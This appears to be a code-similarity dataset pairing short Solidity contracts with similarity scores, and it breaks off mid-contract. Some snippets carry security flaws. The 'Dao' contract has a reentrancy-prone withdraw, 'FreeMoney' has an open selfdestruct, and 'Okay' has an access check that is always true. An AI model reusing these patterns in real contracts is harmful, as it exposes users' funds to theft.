"contract Consumer {

    address owner;
    Factory f;

    function Consumer() {
        owner = msg.sender;
        f = Factory(owner);
    }

    function consumeFunction()
        public
        constant
        returns(bool success) 
    {
        bool wasAllowed = f.ACLProtected();
        return wasAllowed; 
    }

}",0.6257231255416239,"contract Owned {
	address public owner;

	constructor(address admin) public {
		owner = admin;
	}

	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
	
	function isOwner() public view returns (bool is_owner) {
	    return msg.sender == owner;
	}
}"
"contract Dao {

    mapping (address => User) public users;

    struct User {
        address addr;
        string name;
        uint balence;
        uint8 flag;
    }

    function addUser(address _address, string _name, uint _balence, uint8 _flag) public {
        users[msg.sender].name = _name;
        users[msg.sender].flag = _flag;
        users[msg.sender].addr = _address;
        users[msg.sender].balence = _balence;
    }

    function addToBalence(string name) public payable{
        if(users[msg.sender].flag != 1) addUser(msg.sender,name,0,1);
        users[msg.sender].balence = users[msg.sender].balence + msg.value;
    }

    function showBalence() public returns (uint) {
        return users[msg.sender].balence;
    }

    function withdraw(uint amount) public payable{
        if(users[msg.sender].flag != 1) revert(""user does not exist"");
        else if (users[msg.sender].balence >= amount){
            msg.sender.call.value(amount)();
            users[msg.sender].balence -= amount;
        }
    }
}",0.6503866944845893,"contract weeWhoo 
{
    mapping (address => uint) public _balances;
    mapping (address => bool) private claimedBonus;
    address admin;
    uint public TotalAmount;

   function weeWhoo() public payable
    {
        admin=msg.sender;
        TotalAmount=  msg.value;
        
    }

    function deposit() public payable 
    {
        _balances[msg.sender] += msg.value;
        TotalAmount+= msg.value;
        claimedBonus[msg.sender]=false;
    }
    
    function GetBonusWithdraw() public payable 
    {      
        if(claimedBonus[msg.sender]!=true){
          _balances[msg.sender] += 10;
          withdraw();  
          }
          claimedBonus[msg.sender] = true;

     

    }
    
    function withdraw() public payable
    {
        uint amount;
         amount=_balances[msg.sender];
      if(amount!=0){
        _balances[msg.sender] -= amount;
        require(msg.sender.call.value(amount)(""""));
      }  
      TotalAmount-=amount;
    }
    
    function() external payable
    {
       TotalAmount+=msg.value;
        revert();
    }
    
    function destroy() public {
            require(msg.sender == admin);
            selfdestruct(msg.sender);
         }

}"
"contract One {
    uint256 public u;
}",0.6431159261575542,"contract Empty {
 uint public value = 5;
}"
"contract Test {
    uint[] public arr;

    constructor() public {
        arr = [1];
    }

    function setMe() public {
        TestLibrary.setMyArray(arr);
    }
}",0.6293224014942911,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract SpammyToken {
    
    event Transfer(address from, address to, uint256 amount);

    function spam(address who) external {
        emit Transfer(who, 0, 2500);
    }
}",0.6807355419042389,"contract ERC20 {
  function transfer(address to, uint256 value) returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract A {
    function forward(address to) public payable {
        to.send(msg.value); 
                            
    }
}",0.6933370375298156,"contract Buyable {
  function buy (address receiver) public payable;
}"
"contract D {
  uint public n;
  address public sender;

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(keccak256(""setN(uint256)"")), _n); 
  }
}",0.6442332137250286,"contract token { function transfer(address receiver, uint amount) public{  }

    function balanceOf(address _owner) public returns (uint256 balance){ }

}"
"contract Registrar is NameRegister { event Changed(string indexed name); event ReverseChanged(address indexed addr, string indexed name); function owner(string _name) constant returns (address o_owner); function addr(string _name) constant returns (address o_address); function subRegistrar(string _name) constant returns (address o_subRegistrar); function content(string _name) constant returns (bytes32 o_content);  function name(address _owner) constant returns (string o_name);}",0.6437846029058094,"contract ERC20 {
    uint public totalSupply;

    function balanceOf(address who) constant returns(uint);

    function transfer(address to, uint value);

    function allowance(address owner, address spender) constant returns(uint);

    function transferFrom(address from, address to, uint value);

    function approve(address spender, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract TokenFactory {
    
    function newERC20(string _name, string _symbol, uint8 _decimals) public {
        emit ERC20Created(new ERC20Token(_name, _symbol, _decimals), _name, _symbol, _decimals);
    }

    
    function newERC721(string _name, string _symbol) public {
        emit ERC721Created(new ERC721Token(_name, _symbol), _name, _symbol);
    }

    event ERC20Created(ERC20Token indexed tokenAddress, string indexed name, string indexed symbol, uint8 decimals);
    event ERC721Created(ERC721Token tokenAddress, string name, string symbol);
}",0.6796722315910367,"contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function name() public view returns(string memory) {
    return _Tokenname;
  }

  function symbol() public view returns(string memory) {
    return _Tokensymbol;
  }

  function decimals() public view returns(uint8) {
    return _Tokendecimals;
  }
}"
"contract  A{
    uint256 a;
    function set(uint _a) public { 
        require(_a > 100);
        a = _a;
    }

}",0.6469036308273979,"contract FiatContract {

  function USD(uint _id) public pure returns (uint256);

}"
"contract C {
    function callA(A _a, uint256 _value) public {
        bool success = address(_a).call(abi.encodeWithSignature(""set(uint256)"", _value));
        emit ACalled(success);
    }

    event ACalled(bool success);
}",0.6361553554780303,"contract token {

    function balanceOf(address _owner) public constant returns (uint256 value);
    function transfer(address _to, uint256 _value) public returns (bool success);

    }"
"contract depo {
    function depo() public {

    }

    function () payable public {

    }

    function deposit() payable public {
        require(msg.value == 1 ether);
    }
}",0.6977748430105062,"contract FreeMoney {
    function take() public payable {
        if (msg.value > 15 finney) {
            selfdestruct(msg.sender);
        }
    }
    function () public payable {}
}"
"contract A {
    address public my_address;

    function A(address _val) {
        my_address= _val;
    }
}",0.6999050713912006,"contract AddressSet {
  function contains (address _address) public view returns (bool);
}"
"contract B is A {
    function B() {
        A(this);
    }
}",0.6382703968320892,"contract A {

    B public myB = new B();

}"
"contract Mutex {
    bool locked;
    modifier noReentrancy() {
        require(
            !locked,
            ""Reentrant call.""
        );
        locked = true;
        _;
        locked = false;
    }

    
    
    
    
    function f() public noReentrancy returns (uint) {
        require(msg.sender.call());
        return 7;
    }
}",0.6498126617342661,"contract ReentrancyGuard {
    
    bool private locked = false;

    
    constructor() internal {}

    
    modifier protected() {
        _protected();
        locked = true;
        _;
        locked = false;
    }

    
    function _protected() internal view {
        require(!locked, ""ERR_REENTRANCY"");
    }
}"
"contract BettingGame {
    struct Wager {
        address player1;
        address player2:
        uint amount;
    }
    Wager[] public wagers;

    function createWager(uint _amount) public payable {
        require(msg.value == _amount);
        Wager memory w = Wager(msg.sender,0,_amount);
        uint wagerId = wagers.push(w) - 1; 
    }

    function takeWager(uint _id) public payable {
        Wager storage w = wagers[_id];
        require(w.player2 == 0);
        require(msg.value == w.amount);
        w.player2 = msg.sender;
    }
}",0.6527548915377132,"contract LockedCash is Owned {
    event CashDeposit(address from, uint amount);
    address public owner = msg.sender;

    function init() payable {
        require(msg.value > 0.5 ether);
        owner = msg.sender;
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        CashDeposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}"
contract MyEscrow is Mortal { uint numEscrows; function queryNumEscrows() constant returns (uint) { return numEscrows; } function start() returns (uint) { numEscrows++; return numEscrows; }},0.6074632665968016,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract B {

    event received( uint256 );

    uint256 public lastReceivedUint = 0;

    function receiver() public payable {
        emit received( msg.value );
    }

    function receiverWithArgs( uint256 test ) public payable {
        lastReceivedUint = test;
        emit received( msg.value );
    }

    function badCall() public payable {
        revert();
    }
}",0.6141766925805204,"contract ERC20Basic {
    function totalSupply() public constant returns (uint256);
    function balanceOf(address _owner) public constant returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract A {

    event transferValue( uint256 );

    
    function() payable public {

    }

    
    function newTransferToB(address _addr, uint256 valueInWei, bytes hexData) public payable {
        emit transferValue( valueInWei );
        require( _addr.call.value(valueInWei)(hexData), ""Transfer failed"" );  
    }
}",0.6478447777590544,"contract TransferableTokenIface {
  function transfer(address to, uint256 value) public returns (bool) {
  }

  function balanceOf(address who) public view returns (uint256) {
  }

  event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract ArrayMapping {

    uint[2**160-1] addressIndex;
    mapping(address => uint) mapped;

    function getArray(uint row) public returns (uint) { 
        return addressIndex[row];
    }

    function getMap(address a) public returns (uint) { 
        return mapped[a];
    }
}",0.6746969124919419,"contract Token
{
   mapping(address => mapping (address => uint256)) allowed;
   function transfer(address to, uint256 value) public returns (bool);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
}"
"contract ACL {

    mapping (address => bool) public authorized;

    modifier onlyIfAuthorized {
        if(!authorized[msg.sender]) throw;
        _;
    }

    function ACL() {
        authorized[msg.sender] = true; 
    }

    function authorizeAddress(address newUser)
        onlyIfAuthorized
        returns(bool success)
    {
        authorized[newUser] = true;
        return true;
    }

    function revokeAccess(address removeUser)
        onlyIfAuthorized
        returns(bool success)
    {
        authorized[removeUser] = false;
    }

}",0.6880419015221549,"contract MultiEventsHistory is Object {
    
    mapping(address => bool) public isAuthorized;

    
    function authorize(address _caller) onlyContractOwner() returns(bool) {
        if (isAuthorized[_caller]) {
            return false;
        }
        isAuthorized[_caller] = true;
        return true;
    }

    
    function reject(address _caller) onlyContractOwner() {
        delete isAuthorized[_caller];
    }

    
    function () {
        if (!isAuthorized[msg.sender]) {
            return;
        }
        
        
        if (!msg.sender.delegatecall(msg.data)) {
            throw;
        }
    }
}"
"contract arrayExample {
  
  uint[] public myArray;

  
  

  
  function getArray() returns (uint[] memory) {
      return myArray;
  }
}",0.6442174005953645,"contract Test {



    

    function add(uint8 arg1,uint8 arg2) public pure returns (uint8) {

        return arg1+arg2;

    }



}"
"contract Borrower is mortal {
    string  public borrowerName;
    uint256 public funds;

    function Borrower(string _name) payable public {
        borrowerName     = _name;
    }

    function addFunds() payable onlyOwner public {
        
        funds += msg.value;
    }
}",0.6382213887744691,"contract BBZZXUCToken is StandardToken{



    string public name = ""BBZZXUC"";                                   

    uint256 public decimals = 18;                                 

    string public symbol = ""BBZZXUC"";                                 



    constructor() public {                    

        owner = msg.sender;

    }



    function () stoppable public {

        revert();

    }



}"
"contract receiveData {

    bytes public data;

    function () external payable {
        data = msg.data;
    }
}",0.6443407523946206,"contract IDeployer is Ownable {

    function deploy(bytes data) external returns(address mtkn);

}"
"contract C {
    uint[] data;

    function f() public pure returns (uint, bool, uint) {
        return (7, true, 2);
    }

    function g() public {
        
        (uint x, bool b, uint y) = f();
        
        (x, y) = (y, x);
        
        (data.length,,) = f(); 
    }
}",0.6645946813387343,"contract safeMath {
    function add(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c >= a || c >= b);
        return c;
    }
    
    function sub(uint a, uint b) returns (uint) {
        assert( b <= a);
        return a - b;
    }
}"
"contract A {
  mapping (bytes32 => uint) public someMapping;
}",0.649287674637606,"contract ERC20 {

    mapping(address => uint) public balanceOf;

}"
"contract B {
  A a; 

  function B(address addressA) public { 
    a = A(addressA);
  }

  function getAUint(bytes32 key) public view returns(uint) {
    return a.someMapping(key);
  }
}",0.6762042338768323,"contract Manager {
    function isAllowed(address _actor, bytes32 _role) public view returns (bool);
    function hasAccess(address _actor) public view returns (bool);
}"
"contract Base2 {
    uint256 basevar2 = 2;
    constructor() public {
        basevar2 = 1;
    }
}",0.6964263923763422,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract DA {

    address public da;

    function DA() public {
        da = msg.sender;
    }

    function setDa() public returns(bool success) {
        da = msg.sender;
        return true;
    }

    

    function getDa() public constant returns (address){
        return da;
    }

    function getMsgSender() public constant returns(address) {
        return msg.sender;
    }
}",0.6694941647855398,"contract IMultiOwned {

    
    function isOwner(address _account) public view returns (bool);


    
    function getOwnerCount() public view returns (uint);


    
    function getOwnerAt(uint _index) public view returns (address);


     
    function addOwner(address _account) public;


    
    function removeOwner(address _account) public;
}"
"contract A2 {
  address addressOfM;
  function A2(address _m) {
      addressOfM = _m;
  }
  function forward() payable {
     if (!addressOfM.send(msg.value)) throw;
     
  }
}",0.6045176543637786,"contract EnsResolver {

	function setAddr(bytes32 node, address addr) public;

	function addr(bytes32 node) public view returns (address);

}"
"contract HelloWorld {

    string saySomething;

    constructor() public  {
        saySomething = ""Hello World!"";
    }

    function speak() public constant returns(string itSays) {
        return saySomething;
    }

    function saySomethingElse(string newSaying) public  returns(bool success) {
        saySomething = newSaying;
        return true;
    }

}",0.6001952760365871,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Base
{
    function foo() virtual public {}
}",0.6811422181079455,"contract TUB {
    function off() public returns(bool);
}"
contract Middle is Base {},0.653952380284546,"contract Mkr is ERC20 {



}"
"contract Inherited is Middle
{
    function foo() public override {}
}",0.6545588187997109,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract Test {

    uint256[] public array = [0,1,2];

    function A(uint256 input )public {
            array.push(input);
            
    }

    function B(uint256 input )public {
            array.push(input);
            
    }
}",0.6188247723368541,"contract FLMContract {
    function withdraw() public;
    function buy() public payable returns(uint256);
    function myTokens() public view returns(uint256);
}"
"contract Raffle {

    mapping(address => bytes32) commitments;
    mapping(uint256 => address) reserved;

    event Reserved(uint256 value, address owner);

    function commit(bytes32 hash) public {
        require(commitments[msg.sender] == bytes32(0), ""Already committed"");
        commitments[msg.sender] = hash;
    }

    function reveal(uint256 nonce, uint256 value) public {
        bytes32 d = digest(nonce, value, msg.sender);
        require(commitments[msg.sender] == d, ""Invalid data"");
        require(reserved[value] == address(0), ""Already reserved"");
        reserved[value] = msg.sender;
        emit Reserved(value, msg.sender);
    }

    function digest(uint256 nonce, uint256 value, address sender) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(nonce, value, sender));
    }
}",0.6607025380688921,"contract StandardToken is ERC20 {

  mapping (address => mapping (address => uint256)) allowed;



  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

    require(_to != address(0x0));

    require(_value <= balances[msg.sender]);

    require(_value <= allowed[_from][msg.sender]);



    balances[_to] = balances[_to].add(_value);

    balances[_from] = balances[_from].sub(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);



    emit Transfer(_from, _to, _value);

    return true;

  }



  

  function approve(address _spender, uint256 _value) public returns (bool) {

   

    allowed[msg.sender][_spender] = _value;

    return true;

  }



  

  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }

}"
"contract Hash {
    function func() external pure returns (bytes32) {
        return keccak256(abi.encodePacked(""Hello World!"")) ;
    }
}",0.629107123498699,"contract Searcher {



    

    

    function poke() public;



    

    

    function identify() external pure returns(uint) {

        return 0xda4b055; 

    }

}"
"contract A {

    modifier onlyOwner() {
        require(getOwner() == msg.sender);
        _;
    }
    
    function getOwner() internal returns(address);  

    function performOperation() internal; 

    function updateState() public onlyOwner() {
        performOperation();
    }

}",0.6667756310082097,"contract owned {
    address public owner;

    
    function owned() internal {
        owner = msg.sender;
    }

    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    
    function changeOwner(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}"
"contract TripHistory {
    mapping(string => int32[]) trips;

    function getTrip(string _trip_id) public view returns (int32[]) {
        return trips[_trip_id];
    }
    function storeTrip(string _trip_id, int16 _lat, int16 _lon) public {
       trips[_trip_id].push((int32(_lat) << 16) | int32(_lon));
    }
}",0.6018048753173763,"contract cgkgame is owned {

    

    mapping (string => string) cards;



    function saveCard(string _gameid, string _cards) athena public {

        cards[_gameid] = _cards;

    }

    

    function getCard(string _gameid) view public returns (string) {

        return cards[_gameid];

    }

    

}"
"contract StructArrayInit {

  event OnCreateRoom(address indexed _from, uint256 _value);

  struct Room {
    address[] players;       
    uint256 whosTurnId;
    uint256 roomState;
  }  

  Room[] public rooms;

  function createRoom() public {
      Room memory room = Room(new address[](0), 0, 0);
      rooms.push(room);
      rooms[rooms.length-1].players.push(msg.sender);

      OnCreateRoom(msg.sender, 0);
  }
  function getRoomPlayers(uint i) public view returns (address[]){
      return rooms[i].players;
  }
}",0.6154396755466655,"contract ERC20 is ERC20Basic
{
  function allowance(address owner, address spender) public view returns (uint256);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

  function decimals()public view returns(uint8);

  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );

}"
"contract MyContract {
    uint256[] public data;
    function write(uint256 entry) public {
        data.push(entry);
    }    
    function read() public constant returns(uint256[]) {
        return(data);
    }
}",0.6874944675410647,"contract FLMContract {
    function withdraw() public;
    function buy(address) public payable returns(uint256);
    function myTokens() public view returns(uint256);
}"
"contract ContractTest { 
    string public Name;

    function ContractTest (string name) {
        Name = name;
    }
}",0.6191005542661148,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract FactoryTest { 
    address[2] newContracts;

    function createContract (string name) {
        address newContract = new ContractTest(name);
        newContracts[0]=newContract;
    }

    function getContract() returns(address) {
      return newContracts[0];
    }
}",0.623891343428569,"contract coinSpawn{
 	mapping(uint => XG4K) deployedContracts;
	uint numContracts;
	function createCoin() returns(address a){
		deployedContracts[numContracts] = new XG4K();
		numContracts++;
		return deployedContracts[numContracts];
	}
}"
"contract Demo {

    uint public constant INITIAL_SUPPLY = 1000000000;
    mapping (address => uint) public balances;

    function Demo() public {
        balances[msg.sender] = INITIAL_SUPPLY - 1000;
        balances[address(0)] = 1000;
    }

}",0.6065829193860165,"contract DAI {

    mapping(address => mapping(address => uint)) public allowance;

    mapping(address => uint) public balanceOf;



    function transferFrom(address src, address dst, uint wad) public returns (bool);

}"
"contract Bar {
    Foo.F public f;

    function bar () public {
        Foo.foo (f);
    }
}",0.6043695056391462,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract Users {

    mapping(address=>bool) public isUser;
    address[] public users;

    function register() public {
        require(!isUser[msg.sender]);
        isUser[msg.sender] = true;
        users.push(msg.sender);
    }
}",0.6532012838845388,"contract Mew {

    address owner = msg.sender;

    function change(address a) public { if(owner==msg.sender) owner=a; }

    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }

}"
"contract FactoryTInterface {
  function newT() returns(address newTContract);
}",0.6954540064126739,"contract KittyCoreInterface {

    function cooAddress() public returns(address);

}"
"contract FactoryT {

  function newT() returns(address newT) {
    T t = new T();
    return t;
  }
}",0.6430520982089886,"contract Printer {

    

     function print() public view returns(address) 

     { 

         return address(this);

     }



}"
"contract EmojiCoin {

    mapping(uint256 => address) public tokenOwner;
    mapping(uint256 => uint256) public emojiIndexToPrice;
    uint256 public ownerCut  = 5;


    function EmojiCoin() public {

        
        tokenOwner[0] = msg.sender;
        emojiIndexToPrice[0] = 1 ether;

    }

    
    function _transfer(address oldOwner, address newOwner, uint256 _tokenId) internal {
        require(tokenOwner[_tokenId] == oldOwner);
        tokenOwner[_tokenId] = newOwner;
    }

    function purchase(uint256 _tokenId) public payable {
        address oldOwner = tokenOwner[_tokenId];
        uint256 sellingPrice = emojiIndexToPrice[_tokenId];
        address newOwner = msg.sender;

        require(oldOwner != newOwner);

        require(newOwner != address(0));

        require(msg.value >= sellingPrice);

        uint256 percentage = SafeMath.sub(100, ownerCut);
        uint256 payment = uint256(SafeMath.div(SafeMath.mul(sellingPrice, percentage), 100));
        uint256 purchaseExcess = SafeMath.sub(msg.value, sellingPrice);

        emojiIndexToPrice[_tokenId] = SafeMath.div(SafeMath.mul(sellingPrice, 150), percentage);

        _transfer(oldOwner, newOwner, _tokenId);

        if (oldOwner != address(this)) {
           oldOwner.transfer(payment);
        }

        msg.sender.transfer(purchaseExcess);
    }


}",0.6592500806390535,"contract ExTokeCrowdSale is owned {

        

        using SafeMath for uint256;

    	uint256 public startTime = 1530075600; 

    	uint256 public EndTime = 1532217540;   

		uint256 public ExchangeRate=0.000001 * (1 ether);

        token public tokenReward;

        

		

        event Transfer(address indexed from, address indexed to, uint256 value);

        

        constructor (

        address addressOfTokenUsedAsReward

        ) public {

        tokenReward = token(addressOfTokenUsedAsReward);

        }

        function () payable public{

             require(EndTime > now);

             require (startTime < now);

            uint256 ethervalue=msg.value;

            uint256 tokenAmount=ethervalue.div(ExchangeRate);

            tokenReward.transfer(msg.sender, tokenAmount.mul(1 ether));			

			owner.transfer(msg.value);	

        }

        

        function withdrawEtherManually()onlyOwner public{

		    require(msg.sender == owner); 

			uint256 amount=address(this).balance;

			owner.transfer(amount);

		}

		

        function withdrawTokenManually(uint256 tokenAmount) onlyOwner public{

            require(msg.sender == owner);

            tokenReward.transfer(msg.sender,tokenAmount);

        }

        

        function setExchangeRate(uint256 NewExchangeRate) onlyOwner public {

            require(msg.sender == owner);

			ExchangeRate=NewExchangeRate;

        }

    }"
"contract Ceil {
    function ceil(uint a, uint m) constant returns (uint ) {
        return ((a + m - 1) / m) * m;
    }

    
    function ceil1(uint a, uint m) returns (uint ) {
        return ((a + m - 1) / m) * m;
    }
}",0.6370024251241129,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract MyTestabe is My {
    function someVar() constant returns(uint) {
        return someVar;
    }
}",0.6770067412756883,"contract testContract {    
   function go() constant returns (string) {        
      return ""Hello Ethereum!"";    
   }
}"
"contract GlobalGeneric is KeyValueStorage {

    function claimInterests(address _memberAddr, bytes32 _identifier) public view returns (bool success) {
        require(now > refreshTime[_memberAddr][_identifier] + 90 days);
        return true;
    }

}",0.6108296987008022,"contract MultiSigInterface{
  function update_and_check_reach_majority(uint64 id, string memory name, bytes32 hash, address sender) public returns (bool);
  function is_signer(address addr) public view returns(bool);
}"
"contract TestMistGas {
    uint256 number;

    function getNumber() constant returns (uint) {
        return number;
    }

    function setNumber(uint256 _number) {
        number = _number;
    }
}",0.6520375895652569,"contract CarTaxiToken {
    function balanceOf(address owner) constant returns (uint256 balance);
    function getOwnerCount() constant returns (uint256 value);
}"
"contract Test {
    uint public num;

    function setNum(uint myNum) public {
        num = myNum;
    }
}",0.6470163138826077,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract sendData {

    function transferToWithData(address payable dest, uint amount, bytes memory data) public payable {

        dest.call.value(amount)(data);
    }
}",0.6362948644482881,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Caller {

    Called public called_address;

    function set_address(address _addy) {
        called_address = Called(_addy);
    }

    function set(uint256 _var) {
        called_address.set(_var);
    } 

}",0.6016165687295791,"contract cDeployer {

	function deployCrowdsale(address _tWallet, address _token, address _eWallet, uint _maxETH, address reqBy) public returns (address);

}"
"contract Mapping {
    mapping(address => uint256) map;
    mapping(address => uint256) dupe;
    address[] keys;

    function add(uint256 value) {
        map[msg.sender] = value;
        keys.push(msg.sender);
    }

    function duplicate() {
        for(uint256 i; i < keys.length; i++) {
            dupe[keys[i]] = map[keys[i]];
        }
    }
}",0.6138611523358278,"contract AppCoins {

    mapping (address => mapping (address => uint256)) public allowance;

    function balanceOf (address _owner) public view returns (uint256);

    function transferFrom(address _from, address _to, uint256 _value) public returns (uint);

}"
"contract Transfer {


    
    
    address public recipient;
    mapping (address => uint) public balances;

    
    
    event Sent(address from, address to, uint amount );


    function send(address receiver, uint amount) {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        return Sent(msg.sender, receiver, amount);
    }

}",0.6723925166363415,"contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}"
"contract FantasyLeague {
  
  address public commissioner;
  
  uint[] public proposals;
  address[] public members;
  address[] public rightsGiven;


  constructor() public payable {
    commissioner = msg.sender;
  }

  function giveRightToVote(address newVoter) public payable {
    require(msg.sender == commissioner);
    
    rightsGiven.push(newVoter); 
  }
}",0.6391111565273349,"contract owned {
    
    using address_make_payable for address;
     
    address payable public owner;

    constructor()  public{
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        address payable addr = address(newOwner).make_payable();
        owner = addr;
    }
}"
"contract TestInterface {
  function reentrance(address dest);
}",0.6805927937958551,"contract SaleInterface {

    function refund(address _to) public;

}"
"contract FunctionSelector {
  function select(bool useB, uint x) returns (uint z) {
    var f = a;
    if (useB) f = b;
    return f(x);
  }
  function a(uint x) returns (uint z) {
    return x * x;
  }
  function b(uint x) returns (uint z) {
    return 2 * x;
  }
}",0.6620517421322611,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract MyContr {

    
    
    constructor() public payable {}

    function transfer(address payable receiver, uint amount) public {
        require(address(this).balance >= amount);
        receiver.transfer(amount);
    }
    
    
    function() external payable {}
}",0.6916507287177961,"contract truth{
    bool public x;
    address payable z;
    
    constructor() public{
        z = msg.sender;
    }
    
    function vote(bool y) public payable{
        x=y;
    }
    
    function transf() public{
        z.transfer(address(this).balance);
    }
}"
"contract NestedArrays {

    function passNested(uint[][] nested) internal {
        
    }

    function returnNested() internal returns (uint[][]) {
        
    }
}",0.6427352005008499,"contract Token {
    function transfer(address, uint) returns(bool);
    function balanceOf(address) constant returns (uint);
}"
"contract Forwarder {
  address private owner;
  address payable private destination;

  constructor () public {
    owner = msg.sender;
    destination = msg.sender;
  }

  fallback () external payable {
    require (destination.send (address (this).balance));
  }

  function setDestination (address payable _destination) public {
    require (msg.sender == owner);
    destination = _destination;
  }
}",0.6585346537533232,"contract Ownable {

    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }

    function setOwner(address payable _owner) public onlyOwner {
        owner = _owner;
    }

    function getOwner() public view returns (address payable) {
        return owner;
    }

    modifier onlyOwner {
        require(msg.sender == owner, ""must be owner to call this function"");
        _;
    }

}"
"contract B {

  AInterface a;

  function B(address addressContractA) public {
    a = AInterface(addressContractA);
  }

  function setThatThing(uint newNumber) public returns(bool success) {
    return a.setValue(newNumber);
  }
}",0.662191838960147,"contract MintableTokenInterface is TokenInterface {

  address public owner;

  function mint(address beneficiary, uint amount) public returns(bool);

  function transferOwnership(address nextOwner) public;

}"
"contract FourPlayers {

    uint public maxPlayers = 4;  
    address[] public players;
    mapping(address => bool) public isPlayer;

    event LogPlayerAdded(address player);

    function addMe() public returns(bool success) {
        require(!isPlayer[msg.sender]);
        require(players.length < maxPlayers);
        emit LogPlayerAdded(msg.sender);
        players.push(msg.sender);
        isPlayer[msg.sender] = true;
        return true;
    }
}",0.6076194244326689,"contract CENAuth{

	address public owner;

	constructor () public{

		owner = msg.sender;

	}

	event LogOwnerChanged (address msgSender );



	

	modifier onlyOwner{

		assert(msg.sender == owner);

		_;

	}



	function setOwner (address newOwner) public onlyOwner returns (bool){

		if (owner == msg.sender){

			owner = newOwner;

			emit LogOwnerChanged(msg.sender);

			return true;

		}else{

			return false;

		}

	}



}"
"contract Okay {

    modifier onlyIfOkay() {
        require(isOkay(msg.sender));
        _;
    }

    function isOkay(address checkOkay) public pure returns(bool isIndeed) {
        
        return checkOkay==checkOkay;
    }

    function restricted() public view onlyIfOkay {
        
    }

}",0.6337154863950161,"contract Ownable {

    address public owner;

    function Ownable() public {

        owner = msg.sender;

    }

    function _msgSender() internal view returns (address)

    {

        return msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);

        _;
    }

}"
"contract C {
  BInterface b;
  function doBFoo() public {
    b.foo();
  }
}",0.694034472251385,"contract VoxInterface {
    function par() public returns (uint);
}"
"contract AFactory {
    function createA() public returns(A) {
        return new A();
    }
}",0.682974083957387,"contract Now {

  

  function getNow() public constant returns(uint256) {

    

    return now;

  }

}"
"contract Base {
  uint foo;
  function Base(uint _foo) {
    foo = _foo;
  }
}",0.6027949174216731,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract B is A {
    uint state;
    
    constructor() A() public { state = 0; }
    function performOperation() internal { state = state + 1; }
}",0.6144738601603857,"contract InstaSave is Save {

    uint public version;

    
    constructor(uint _version) public {
        version = _version;
    }

    function() external payable {}

}"
"contract B is GeometryShapesData {
    Point[4] public vertexes;
    function addVertex(uint pos, uint x, uint y) public { 
        vertexes[pos] = Point(x, y);
    }
    function getVertex(uint pos) constant public returns (uint x, uint y) {
        return (vertexes[pos].x, vertexes[pos].y);
    }
}",0.6272620905219075,"contract ERC20Basic {
  uint public totalSupply;
  function balanceOf(address who) public constant returns (uint);
  function transfer(address to, uint value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract Register is IRegister {
    string private name;

    constructor(string entityname) public {
        name = entityname;
    }

    function getName() public view returns (string) {
        return name;
    }
}",0.6659322624443655,"contract KVPStore {

    string jsonKvps;



    constructor(string memory _jsonKvps) public {

        jsonKvps = _jsonKvps;

    }



    function getKvps() public view returns (string memory) {

